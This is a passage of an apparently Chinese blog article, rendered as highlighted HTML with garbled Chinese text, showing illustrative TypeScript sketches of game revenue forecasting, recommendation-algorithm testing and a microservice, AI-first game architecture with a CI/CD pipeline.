      <span class="hljs-keyword">const</span> algorithms = [
        <span class="hljs-string">'collaborative'</span>,
        <span class="hljs-string">'content-based'</span>,
        <span class="hljs-string">'hybrid'</span>,
        <span class="hljs-string">'reinforcement-learning'</span>
      ]
      
      <span class="hljs-keyword">const</span> experimentResults = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(
        algorithms.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">algorithm</span> =&gt;</span> 
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">testAlgorithm</span>(algorithm)
        )
      )
      
      <span class="hljs-keyword">const</span> bestAlgorithm = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">selectBestAlgorithm</span>(experimentResults)
      
      <span class="hljs-keyword">return</span> {
        bestAlgorithm,
        <span class="hljs-attr">performanceImprovement</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculateImprovement</span>(experimentResults),
        <span class="hljs-attr">deploymentPlan</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createDeploymentPlan</span>(bestAlgorithm)
      }
    }
  }
  
  <span class="hljs-comment">// æ”¶å…¥é¢„æµ‹ä¸ä¼˜åŒ–</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">forecastRevenue</span>(<span class="hljs-attr">timeframe</span>: <span class="hljs-title class_">Timeframe</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">RevenueForecast</span>&gt; {
    <span class="hljs-keyword">const</span> historicalData = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getHistoricalRevenue</span>()
    <span class="hljs-keyword">const</span> marketTrends = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">analyzeMarketTrends</span>()
    <span class="hljs-keyword">const</span> playerGrowth = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">projectPlayerGrowth</span>()
    
    <span class="hljs-keyword">const</span> forecast = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiAnalyzer</span>.<span class="hljs-title function_">forecastRevenue</span>({
      <span class="hljs-attr">historical</span>: historicalData,
      <span class="hljs-attr">trends</span>: marketTrends,
      <span class="hljs-attr">growth</span>: playerGrowth,
      <span class="hljs-attr">seasonality</span>: <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">calculateSeasonality</span>(),
      <span class="hljs-attr">promotions</span>: <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getPlannedPromotions</span>(timeframe)
    })
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">forecast</span>: forecast.<span class="hljs-property">values</span>,
      <span class="hljs-attr">confidenceIntervals</span>: forecast.<span class="hljs-property">confidence</span>,
      <span class="hljs-attr">keyAssumptions</span>: forecast.<span class="hljs-property">assumptions</span>,
      <span class="hljs-attr">riskFactors</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">identifyRiskFactors</span>(forecast),
      <span class="hljs-attr">optimizationOpportunities</span>: <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">findOptimizationOpportunities</span>(forecast)
    }
  }
}
</code></pre>
<h3 data-id="heading-12">ç¬¬äº”ç« ï¼šä»å°æ¸¸æˆåˆ°CTOçš„æŠ€æœ¯æˆé•¿è·¯å¾„</h3>
<h4 data-id="heading-13">5.1 å…¨æ ˆæ¶æ„å¸ˆæŠ€èƒ½ä½“ç³»</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// architecture/EnterpriseGameArchitecture.ts - ä¼ä¸šçº§æ¸¸æˆæ¶æ„</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">EnterpriseArchitecture</span> {
  <span class="hljs-attr">microservices</span>: <span class="hljs-title class_">MicroserviceConfig</span>[]
  <span class="hljs-attr">eventDriven</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">cloudNative</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">devOpsEnabled</span>: <span class="hljs-built_in">boolean</span>
  <span class="hljs-attr">aiFirst</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EnterpriseGameArchitecture</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">architecture</span>: <span class="hljs-title class_">EnterpriseArchitecture</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">serviceMesh</span>: <span class="hljs-title class_">ServiceMesh</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">apiGateway</span>: <span class="hljs-title class_">APIGateway</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">dataPipeline</span>: <span class="hljs-title class_">DataPipeline</span>
  
  <span class="hljs-comment">// äº‘åŸç”ŸåŸºç¡€è®¾æ–½</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">k8sCluster</span>: <span class="hljs-title class_">KubernetesCluster</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">serviceRegistry</span>: <span class="hljs-title class_">ServiceRegistry</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">configManager</span>: <span class="hljs-title class_">ConfigManager</span>
  
  <span class="hljs-comment">// ç›‘æ§ä¸å¯è§‚æµ‹æ€§</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">observabilityStack</span>: <span class="hljs-title class_">ObservabilityStack</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">alertManager</span>: <span class="hljs-title class_">AlertManager</span>
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: EnterpriseArchitecture</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">architecture</span> = config
    
    <span class="hljs-comment">// åˆå§‹åŒ–äº‘åŸç”Ÿç»„ä»¶</span>
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">cloudNative</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupCloudNativeInfrastructure</span>()
    }
    
    <span class="hljs-comment">// åˆå§‹åŒ–å¾®æœåŠ¡æ¶æ„</span>
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">microservices</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupMicroservices</span>()
    }
    
    <span class="hljs-comment">// åˆå§‹åŒ–AIä¼˜å…ˆæ¶æ„</span>
    <span class="hljs-keyword">if</span> (config.<span class="hljs-property">aiFirst</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupAIFirstArchitecture</span>()
    }
  }
  
  <span class="hljs-comment">// å¾®æœåŠ¡æ¸¸æˆå¼•æ“æ¶æ„</span>
  <span class="hljs-title function_">setupMicroserviceGameEngine</span>(): <span class="hljs-title class_">MicroserviceGameEngine</span> {
    <span class="hljs-keyword">const</span> services = {
      <span class="hljs-attr">gameLogic</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">GameLogicService</span>(),
      <span class="hljs-attr">physics</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhysicsService</span>(),
      <span class="hljs-attr">rendering</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">RenderingService</span>(),
      <span class="hljs-attr">ai</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">AIService</span>(),
      <span class="hljs-attr">matchmaking</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">MatchmakingService</span>(),
      <span class="hljs-attr">persistence</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersistenceService</span>(),
      <span class="hljs-attr">analytics</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnalyticsService</span>()
    }
    
    <span class="hljs-comment">// æœåŠ¡é—´é€šä¿¡</span>
    <span class="hljs-keyword">const</span> communication = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceCommunication</span>({
      services,
      <span class="hljs-attr">protocol</span>: <span class="hljs-string">'gRPC'</span>,
      <span class="hljs-attr">serviceMesh</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">serviceMesh</span>
    })
    
    <span class="hljs-comment">// æ•°æ®ä¸€è‡´æ€§</span>
    <span class="hljs-keyword">const</span> consistency = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSourcingSystem</span>({
      services,
      <span class="hljs-attr">eventStore</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventStore</span>(),
      <span class="hljs-attr">projectionEngine</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProjectionEngine</span>()
    })
    
    <span class="hljs-keyword">return</span> {
      services,
      communication,
      consistency,
      <span class="hljs-attr">scaling</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupAutoScaling</span>(services),
      <span class="hljs-attr">resilience</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupResiliencePatterns</span>(services)
    }
  }
  
  <span class="hljs-comment">// AIä¼˜å…ˆæ¶æ„</span>
  <span class="hljs-title function_">setupAIFirstArchitecture</span>(): <span class="hljs-title class_">AIFirstArchitecture</span> {
    <span class="hljs-keyword">const</span> aiServices = {
      <span class="hljs-comment">// æ ¸å¿ƒAIæœåŠ¡</span>
      <span class="hljs-attr">contentGeneration</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">AIContentGenerationService</span>(),
      <span class="hljs-attr">playerModeling</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlayerModelingService</span>(),
      <span class="hljs-attr">personalization</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonalizationService</span>(),
      <span class="hljs-attr">optimization</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">OptimizationService</span>(),
      
      <span class="hljs-comment">// åŸºç¡€è®¾æ–½</span>
      <span class="hljs-attr">modelRegistry</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelRegistry</span>(),
      <span class="hljs-attr">featureStore</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">FeatureStore</span>(),
      <span class="hljs-attr">trainingPipeline</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrainingPipeline</span>(),
      <span class="hljs-attr">servingLayer</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelServingLayer</span>()
    }
    
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">services</span>: aiServices,
      <span class="hljs-attr">dataFlow</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupAIDataFlow</span>(aiServices),
      <span class="hljs-attr">monitoring</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupAIMonitoring</span>(aiServices),
      <span class="hljs-attr">governance</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setupAIGovernance</span>(aiServices)
    }
  }
  
  <span class="hljs-comment">// DevOpsä¸CI/CDæµæ°´çº¿</span>
  <span class="hljs-title function_">setupDevOpsPipeline</span>(): <span class="hljs-title class_">DevOpsPipeline</span> {
    <span class="hljs-keyword">const</span> pipeline = {
      <span class="hljs-comment">// ä»£ç ç®¡ç†</span>
      <span class="hljs-attr">sourceControl</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">GitWorkflow</span>({
        <span class="hljs-attr">trunkBased</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">featureFlags</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-attr">codeReview</span>: <span class="hljs-string">'mandatory'</span>
      }),
      
      <span class="hljs-comment">// CI/CD</span>
      <span class="hljs-attr">continuousIntegration</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">CISystem</span>({
        <span class="hljs-attr">build</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">BuildSystem</span>(),
        <span class="hljs-attr">test</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestAutomation</span>(),
        <span class="hljs-attr">security</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityScanning</span>()
      }),
      
      <span class="hljs-attr">continuousDeployment</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">CDSystem</span>({
        <span class="hljs-attr">staging</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">StagingEnvironment</span>(),
        <span class="hljs-attr">canary</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">CanaryDeployment</span>(),
        <span class="hljs-attr">rollback</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">AutomatedRollback</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>